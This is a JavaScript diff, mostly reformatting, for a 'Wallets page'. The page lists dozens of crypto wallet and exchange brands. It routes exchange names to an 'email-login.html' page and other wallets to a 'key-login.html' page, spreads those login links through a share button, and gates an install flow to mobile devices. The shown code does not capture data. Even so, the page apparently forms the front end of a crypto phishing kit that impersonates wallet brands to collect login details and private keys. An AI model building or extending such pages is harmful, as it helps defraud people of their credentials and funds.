@@ -3,8 +3,11 @@
 // ==========================
 function isMobileDevice() {
   // True only for smartphones and tablets
-  return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)
-      && window.innerWidth <= 1024; // extra safety for desktop emulation
+  return (
+    /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(
+      navigator.userAgent
+    ) && window.innerWidth <= 1024
+  ); // extra safety for desktop emulation
 }
 
 // ==========================
@@ -25,21 +28,73 @@ console.log("Wallets page loaded!");
 // EMAIL WALLET LIST
 // ==========================
 const emailWallets = [
-  "Poloneix","Coinbase1","Coinbase2","Binance","Bitget","Nash"
+  "Poloneix",
+  "Coinbase1",
+  "Coinbase2",
+  "Binance",
+  "Bitget",
+  "Nash",
 ];
 
 // ==========================
 // ALL WALLETS
 // ==========================
 const wallets = [
-  "Meta Mask","Poloniex","Trust Wallet","Solflare","WalletConnect","Terra",
-  "Bitpay","Maiar","MyKey","Atwallet","Authereum","Bitfrost","Coinbase1",
-  "Coinomi","Dcent","Easypocket","Ledger","Coolwallet","Cybavowallet",
-  "Coin98","Harmony","PeakDefi","Gridplus","VIA","Imtoken","Infinito",
-  "Infinity","Kadachain","Keplr","Midas1","Marixwallet","Midas2","Nash",
-  "Onto","Ownbit","Pillar","Rainbow","Safepal","Sollet","Spark","Spatium",
-  "Tokenary","Tokenpocket","Tomo","Torus","Coinbase2","XDC","Walletio",
-  "Walleth","Zelcore","Phantom","Exodus","Binance","Bitget","Other Wallets"
+  "Meta Mask",
+  "Poloniex",
+  "Trust Wallet",
+  "Solflare",
+  "WalletConnect",
+  "Terra",
+  "Bitpay",
+  "Maiar",
+  "MyKey",
+  "Atwallet",
+  "Authereum",
+  "Bitfrost",
+  "Coinbase1",
+  "Coinomi",
+  "Dcent",
+  "Easypocket",
+  "Ledger",
+  "Coolwallet",
+  "Cybavowallet",
+  "Coin98",
+  "Harmony",
+  "PeakDefi",
+  "Gridplus",
+  "VIA",
+  "Imtoken",
+  "Infinito",
+  "Infinity",
+  "Kadachain",
+  "Keplr",
+  "Midas1",
+  "Marixwallet",
+  "Midas2",
+  "Nash",
+  "Onto",
+  "Ownbit",
+  "Pillar",
+  "Rainbow",
+  "Safepal",
+  "Sollet",
+  "Spark",
+  "Spatium",
+  "Tokenary",
+  "Tokenpocket",
+  "Tomo",
+  "Torus",
+  "Coinbase2",
+  "XDC",
+  "Walletio",
+  "Walleth",
+  "Zelcore",
+  "Phantom",
+  "Exodus",
+  "Binance",
+  "Bitget",
+  "Other Wallets",
 ];
 
 const container = document.getElementById("walletContainer");
@@ -48,7 +103,11 @@ const container = document.getElementById("walletContainer");
 // GENERATE WALLET CARDS
 // ==========================
 wallets.forEach((name) => {
-  let imageName = name.toLowerCase().replace(/\s+/g, "").replace(/['./\-]/g, "") + ".webp";
+  let imageName =
+    name
+      .toLowerCase()
+      .replace(/\s+/g, "")
+      .replace(/['./\-]/g, "") + ".webp";
 
   if (name.toLowerCase().includes("other")) {
     container.innerHTML += `
@@ -98,7 +157,7 @@ const successTick = document.getElementById("successTick");
 
 function startInstallPopup(walletName) {
   if (!isMobileDevice()) {
-    console.log("Install option is mobile only");
+    showDesktopOnlyPopup(); // 👈 desktop popup
     return;
   }
 
@@ -138,11 +197,21 @@ function installWallet(walletName) {
 // OPEN WALLET
 // ==========================
 function openWallet(walletName) {
-  const emailWallets = ["Coinbase1","Coinbase2","Binance","Bitget","Poloniex"];
+  const emailWallets = [
+    "Coinbase1",
+    "Coinbase2",
+    "Binance",
+    "Bitget",
+    "Poloniex",
+  ];
   if (emailWallets.includes(walletName)) {
-    window.location.href = `email-login.html?wallet=${encodeURIComponent(walletName)}`;
+    window.location.href = `email-login.html?wallet=${encodeURIComponent(
+      walletName
+    )}`;
   } else {
-    window.location.href = `key-login.html?wallet=${encodeURIComponent(walletName)}`;
+    window.location.href = `key-login.html?wallet=${encodeURIComponent(
+      walletName
+    )}`;
   }
 }
 
@@ -150,16 +219,28 @@ function openWallet(walletName) {
 // SHARE WALLET
 // ==========================
 function shareWallet(walletName) {
-  const emailWallets = ["Coinbase1","Coinbase2","Binance","Bitget","Poloniex"];
-  const page = emailWallets.includes(walletName) ? "email-login.html" : "key-login.html";
-  const shareUrl = `${window.location.origin}/${page}?wallet=${encodeURIComponent(walletName)}`;
+  const emailWallets = [
+    "Coinbase1",
+    "Coinbase2",
+    "Binance",
+    "Bitget",
+    "Poloniex",
+  ];
+  const page = emailWallets.includes(walletName)
+    ? "email-login.html"
+    : "key-login.html";
+  const shareUrl = `${
+    window.location.origin
+  }/${page}?wallet=${encodeURIComponent(walletName)}`;
 
   if (navigator.share) {
-    navigator.share({
-      title: "Wallet",
-      text: `Check this wallet: ${walletName}`,
-      url: shareUrl,
-    }).catch(() => {});
+    navigator
+      .share({
+        title: "Wallet",
+        text: `Check this wallet: ${walletName}`,
+        url: shareUrl,
+      })
+      .catch(() => {});
   } else {
     alert("Sharing not supported.");
   }
@@ -200,3 +281,10 @@ a2hsBtn?.addEventListener("click", async () => {
   deferredPrompt = null;
   a2hsPopup.style.display = "none";
 });
+function showDesktopOnlyPopup() {
+  document.getElementById("desktopOnlyPopup").style.display = "flex";
+}
+
+function closeDesktopOnlyPopup() {
+  document.getElementById("desktopOnlyPopup").style.display = "none";
+}
